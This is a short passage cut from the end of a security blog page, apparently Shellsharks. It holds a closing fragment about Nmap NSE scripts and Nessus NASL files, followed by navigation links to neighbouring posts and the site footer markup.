Nmap NSE scripts and Nessus NASL files.</span></div><br/><div class="PageNavigation"> <a class="prev" style="margin-right: 2em;" href="/security-txt#title">&laquo; A Method for Web Security Policies (security.txt)</a><div style="float:right;"><a class="next" href="/nessus-lies#title" style="margin-right:0;">Nessus is Lying to Us [Updated] &raquo;</a></div></div></main><aside class="container_item"></aside><footer class="container_item"> <center><span style="color:var(--light-font-color); font-size:.8em; font-style:italic; position:relative; top:25px;">Brought to you with <i class="ph-fill ph-heart-straight" style="color:var(--accent-color);"></i> by <a href="https://shellsharks.com/about">Shellsharks</a></span></center> <center> <img id="sharkfooter" src="/assets/img/sharks-circling.png" alt="Circling Sharks" style="width:150px;"></img> </center></footer></div><noscript><div class="panel" align="center" style="font-weight:bold;"><h1>Please enable JavaScript.</h1></div></noscript> <script src="/assets/js/themeswitcher.js"></script>
